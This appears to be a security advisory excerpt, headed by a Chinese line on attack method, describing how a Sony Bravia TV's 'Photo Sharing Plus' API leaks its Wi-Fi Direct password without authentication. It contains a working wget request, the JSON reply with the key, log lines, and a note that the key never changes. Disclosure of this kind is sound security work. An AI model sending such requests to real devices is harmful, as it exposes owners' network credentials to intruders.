攻击方式：需要访问系统，如果是内部人员的话，只需要在命令行中按步骤操作就能找到敏感信息

An unauthenticated remote attacker can retrieve the plaintext wireless password
through the "Photo Sharing Plus" API.

After starting the application, the following example retrieves the wireless
password created from the TV (IP address of the TV is 192.168.1.102) over the
LAN, without authentication:

```
root@kali:~# wget -qO- --post-data='{"id":80,"method":"getContentShareServerInfo","params":[],"version":"1.0"}' 
http://[ip_tv]:10000/contentshare/
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

The password is 8362tbwX.

By reading logs of the TV, we can confirm the password has been delivered over
HTTP, without authentication. The logs contain password in plain-text:

```
01-01 07:47:23.730 5539 18687 I System.out: [MEXI][D] HttpEndPoint: send: 
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

It is also important to note that the generated Wireless password by the TV is
always the same. Even after a hard reboot and a disconnection from the power
supply, the generated password will be always the same. This lack of randomness
is also a security issue.
